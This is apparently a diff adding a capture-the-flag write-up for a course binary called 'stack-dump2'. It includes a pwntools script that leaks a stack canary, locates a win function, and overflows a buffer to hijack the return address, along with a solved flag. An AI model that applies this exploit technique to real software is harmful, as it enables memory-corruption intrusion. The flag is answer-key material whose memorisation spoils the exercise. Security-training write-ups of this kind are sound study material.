@@ -72,3 +72,77 @@ p.sendline(payload)
 
 p.interactive() 
 ```
+
+---
+
+# stack-dump2
+
+> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNS1zdGFjay1kdW1wMiIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiIzNzNjY2E0YS05MzE3LTQwOGUtYThlMi1iM2I3NmE5YzJiYjUifQ.7k0UECcN17jxnjYJqJsrgtQddBXb4GkEPqg0qytD20k}
+
+## Scenario
+
+Similar to the week 3 stack-dump exercise, however this time with all protections enabled.  
+We will need to leak the canary (input -> dump) in order to successfully override the return address of main
+
+## Solution
+
+An address on the stack is given, which we can use to calculate the address of the canary. By then using the memory map, we can figure out where the win function address has been relocated to.  
+With the canary value and the win address, we can perform a buffer overflow at ebp-0x68.
+
+## Script
+
+```python3
+from pwn import *
+
+p = process("./stack-dump2")
+p = remote("plsdonthaq.me", 5002)
+
+# Get the canary address
+p.recvuntil("To make things easier, here's a useful stack pointer ")
+stackAddr = int(p.recvline(keepends=False), 16)
+print(f"Received stack address {hex(stackAddr)}")
+ebp = stackAddr + 0x71
+print(f"main::ebp = {hex(ebp)}")
+canary_addr = ebp - 0x8
+print(f"main::canary at {hex(canary_addr)}")
+
+# Get the canary value
+p.sendline(b'a')
+p.recv()
+p.sendline(b'5')
+p.recv()
+p.sendline(p32(canary_addr))
+p.recv()
+p.sendline('b')
+p.recvuntil(": ")
+canary = p.recvline(keepends=False)[:4]
+print(f"Canary value is: {canary}")
+
+# Get the win address
+p.recv()
+p.sendline(b'c')
+BASE = int(p.recvline().split(b'-')[0], 16)
+p.recv()
+print(f"Program base address is {hex(BASE)}")
+print(f"main should be at {hex(BASE + 0x796)}")
+win_offset = 0x76d
+win_addr = BASE + win_offset
+print(f"win address at at {hex(win_addr)}")
+
+# Perform the buffer overflow
+payload = b""
+payload += b'.' * (0x68-0x8)
+payload += canary
+payload += b'.' * 8
+payload += p32(win_addr)
+
+p.sendline(b'a')
+p.sendline(str(len(payload) + 1))
+p.sendline(payload)
+
+# Now exit/return from main
+p.sendline("d")
+p.interactive()
+```
+
+---
